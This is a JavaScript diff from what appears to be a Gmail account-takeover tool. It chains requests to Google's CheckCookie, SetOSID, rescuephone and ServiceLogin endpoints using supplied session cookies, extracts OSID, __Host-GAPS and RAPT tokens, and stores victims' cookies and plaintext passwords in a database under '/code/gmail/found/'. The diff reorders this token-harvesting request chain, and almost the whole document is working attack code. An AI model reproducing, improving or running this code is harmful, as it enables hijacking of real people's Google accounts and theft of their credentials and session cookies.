@@ -107,8 +107,6 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps) {
         let output = 0
 
         console.log('Passwort Try: '+loop)
-        
-        console.log(body)
 
         if(again == 0) {
             try {
@@ -171,82 +169,7 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps) {
                     let mRAPT = split[0]
                     wrong = false
 
-                    request({
-                        url: 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fpersonal-info',
-                        method: 'GET',
-                        headers: {
-                            'Cookie': sendCookies,
-                            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                        },
-                        followRedirect: false
-                    }, function(error, responce, body) {
-                        let wrong = true
-                        try {
-                            if(!error && responce.headers['location']) {
-                                let url = decodeURIComponent(responce.headers['location'])  
-                                let index = url.indexOf('osidt=')
-                                let split = url.substring(index+6, url.length).split('&')
-                                let tempCookes = sendCookies
-                                tempCookes += 'OSID=Lgh3m_XDdCpAmGim5eO6xW8csVs0m9rLO6I7FHHeiGEViTAiQK_GhRhgeVwISYbsIeMp1g.; '
-                                wrong = false
-                                request({
-                                    url: 'https://myaccount.google.com/accounts/SetOSID?continue=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1&osidt='+split[0],
-                                    method: 'GET',
-                                    headers: {
-                                        'Cookie': tempCookes
-                                    },
-                                    followRedirect: false
-                                }, function(error, responce, body) {
-                                    let wrong = true
-                                    try {
-                                        if(!error && responce.headers['set-cookie']) {
-                                            cookiesList = responce.headers['set-cookie']
-        
-                                            for(let i=0; i<cookiesList.length; i++) {
-                                                let singelData = cookiesList[i]
-                                                try {
-                                                    let start = singelData.indexOf('=')
-                                                    let end = singelData.indexOf(';')
-                                                    let key = singelData.substring(0, start)
-                                                    if(key == 'OSID') {
-                                                        sendCookies += 'OSID='+singelData.substring(start+1, end)
-                                                        i = cookiesList.length
-                                                    }
-                                                } catch (e) {}
-                                            }
-                                            
-                                            wrong = false
-                                            Completed(connection, password, mData, sendCookies, mRAPT)
-                                        }
-                                    } catch (e) {}
-
-                                    try {
-                                        if(wrong && connection != null) {
-                                            let send = sendCookies
-                                            if(send == null) {
-                                                send = {}
-                                            }
-                                            send['PASS'] = password
-                                            database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                            connection.end(mData[0]+' 5')
-                                        }
-                                    } catch (e) {}
-                                })
-                            }
-                        } catch (e) {}
-
-                        try {
-                            if(wrong && connection != null) {
-                                let send = sendCookies
-                                if(send == null) {
-                                    send = {}
-                                }
-                                send['PASS'] = password
-                                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                connection.end(mData[0]+' 4')
-                            }
-                        } catch (e) {}
-                    })
+                    Completed(connection, password, mData, sendCookies, mRAPT)
                 }
             } catch (e) {}
 
@@ -276,84 +199,157 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps) {
 function getRaptToken(connection, password, mData, sendCookies) {
 
     request({
-        url: 'https://myaccount.google.com/signinoptions/rescuephone',
+        url: 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fpersonal-info',
         method: 'GET',
         headers: {
             'Cookie': sendCookies,
             'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
         },
         followRedirect: false
-    }, function(error, response, body) {
+    }, function(error, responce, body) {
         let wrong = true
         try {
-            if (!error) {
-                let headers = response.headers
-                console.log(headers['location'])
-                if(headers && headers['location']) {
-                    let index = headers['location'].indexOf('rart=')
-                    let split = headers['location'].substring(index, headers['location'].length).split('&')
-                    wrong = false
-                    request({
-                        url: 'https://accounts.google.com/ServiceLogin?'+split[0],
-                        method: 'GET',
-                        headers: {
-                            'Cookie': sendCookies,
-                            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                        },
-                        followRedirect: false
-                    }, function(error, response, body) {
-                        let wrong = true
-                        try {
-                            if (!error) {
-                                let headers = response.headers
-                                console.log(headers['location'])
-                                 if(headers && headers['location']) {
-                                    let index = headers['location'].indexOf('TL=')
-                                    let tl = headers['location'].substring(index+3, headers['location'].length).split('&')[0]
-                                    index = headers['location'].indexOf('cid=')
-                                    let cid = headers['location'].substring(index+4, headers['location'].length).split('&')[0]
-                                    cookiesList = headers['set-cookie']
-                                    let gps = mData[4]
-                                    console.log(gps)
-                                    for(let i=0; i<cookiesList.length; i++) {
-                                        let singelData = cookiesList[i]
-                                        try {
-                                            let start = singelData.indexOf('=')
-                                            let end = singelData.indexOf(';')
-                                            let key = singelData.substring(0, start)
-                                            if(key == '__Host-GAPS') {
-                                                gps = singelData.substring(start+1, end)
-                                                i = cookiesList.length
-                                            }
-                                        } catch (e) {}
+            if(!error && responce.headers['location']) {
+                let url = decodeURIComponent(responce.headers['location'])  
+                let index = url.indexOf('osidt=')
+                let split = url.substring(index+6, url.length).split('&')
+                let tempCookes = sendCookies
+                tempCookes += 'OSID=Lgh3m_XDdCpAmGim5eO6xW8csVs0m9rLO6I7FHHeiGEViTAiQK_GhRhgeVwISYbsIeMp1g.; '
+                wrong = false
+                request({
+                    url: 'https://myaccount.google.com/accounts/SetOSID?continue=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1&osidt='+split[0],
+                    method: 'GET',
+                    headers: {
+                        'Cookie': tempCookes
+                    },
+                    followRedirect: false
+                }, function(error, responce, body) {
+                    let wrong = true
+                    try {
+                        if(!error && responce.headers['set-cookie']) {
+                            cookiesList = responce.headers['set-cookie']
+
+                            for(let i=0; i<cookiesList.length; i++) {
+                                let singelData = cookiesList[i]
+                                try {
+                                    let start = singelData.indexOf('=')
+                                    let end = singelData.indexOf(';')
+                                    let key = singelData.substring(0, start)
+                                    if(key == 'OSID') {
+                                        sendCookies += 'OSID='+singelData.substring(start+1, end)
+                                        i = cookiesList.length
                                     }
-                                    console.log(gps)
-                                    wrong = false
-                                    mData[3] = tl
-                                    mData[4] = gps
-                                    mData[5] = cid
-                                    mData[6] = password
-                                    passwordMatching(connection, mData, sendCookies, 1, 0, gps)
-                                }
-                            } else {}
-                        } catch (e) {}
-                        
-                        try {
-                            if(wrong && connection != null) {
-                                let send = sendCookies
-                                if(send == null) {
-                                    send = {}
-                                }
-                                send['PASS'] = password
-                                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                                connection.end(mData[0]+' 2')
+                                } catch (e) {}
                             }
-                        } catch (e) {}
-                    })
-                }
-            } else {}
+                            
+                            wrong = false
+
+                            request({
+                                url: 'https://myaccount.google.com/signinoptions/rescuephone',
+                                method: 'GET',
+                                headers: {
+                                    'Cookie': sendCookies,
+                                    'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
+                                },
+                                followRedirect: false
+                            }, function(error, response, body) {
+                                let wrong = true
+                                try {
+                                    if (!error) {
+                                        let headers = response.headers
+                                        if(headers && headers['location']) {
+                                            let index = headers['location'].indexOf('rart=')
+                                            let split = headers['location'].substring(index, headers['location'].length).split('&')
+                                            wrong = false
+                                            request({
+                                                url: 'https://accounts.google.com/ServiceLogin?'+split[0],
+                                                method: 'GET',
+                                                headers: {
+                                                    'Cookie': sendCookies,
+                                                    'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
+                                                },
+                                                followRedirect: false
+                                            }, function(error, response, body) {
+                                                let wrong = true
+                                                try {
+                                                    if (!error) {
+                                                        let headers = response.headers
+                                                        console.log(headers['location'])
+                                                         if(headers && headers['location']) {
+                                                            let index = headers['location'].indexOf('TL=')
+                                                            let tl = headers['location'].substring(index+3, headers['location'].length).split('&')[0]
+                                                            index = headers['location'].indexOf('cid=')
+                                                            let cid = headers['location'].substring(index+4, headers['location'].length).split('&')[0]
+                                                            cookiesList = headers['set-cookie']
+                                                            let gps = mData[4]
+                                                            for(let i=0; i<cookiesList.length; i++) {
+                                                                let singelData = cookiesList[i]
+                                                                try {
+                                                                    let start = singelData.indexOf('=')
+                                                                    let end = singelData.indexOf(';')
+                                                                    let key = singelData.substring(0, start)
+                                                                    if(key == '__Host-GAPS') {
+                                                                        gps = singelData.substring(start+1, end)
+                                                                        i = cookiesList.length
+                                                                    }
+                                                                } catch (e) {}
+                                                            }
+                                                            wrong = false
+                                                            mData[3] = tl
+                                                            mData[4] = gps
+                                                            mData[5] = cid
+                                                            mData[6] = password
+                                                            passwordMatching(connection, mData, sendCookies, 1, 0, gps)
+                                                        }
+                                                    } else {}
+                                                } catch (e) {}
+                                                
+                                                try {
+                                                    if(wrong && connection != null) {
+                                                        let send = sendCookies
+                                                        if(send == null) {
+                                                            send = {}
+                                                        }
+                                                        send['PASS'] = password
+                                                        database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                                        connection.end(mData[0]+' 2')
+                                                    }
+                                                } catch (e) {}
+                                            })
+                                        }
+                                    } else {}
+                                } catch (e) {}
+                                
+                                try {
+                                    if(wrong && connection != null) {
+                                        let send = sendCookies
+                                        if(send == null) {
+                                            send = {}
+                                        }
+                                        send['PASS'] = password
+                                        database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                        connection.end(mData[0]+' 3')
+                                    }
+                                } catch (e) {}
+                            })
+                        }
+                    } catch (e) {}
+
+                    try {
+                        if(wrong && connection != null) {
+                            let send = sendCookies
+                            if(send == null) {
+                                send = {}
+                            }
+                            send['PASS'] = password
+                            database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                            connection.end(mData[0]+' 5')
+                        }
+                    } catch (e) {}
+                })
+            }
         } catch (e) {}
-        
+
         try {
             if(wrong && connection != null) {
                 let send = sendCookies
@@ -362,7 +358,7 @@ function getRaptToken(connection, password, mData, sendCookies) {
                 }
                 send['PASS'] = password
                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
-                connection.end(mData[0]+' 3')
+                connection.end(mData[0]+' 4')
             }
         } catch (e) {}
     })
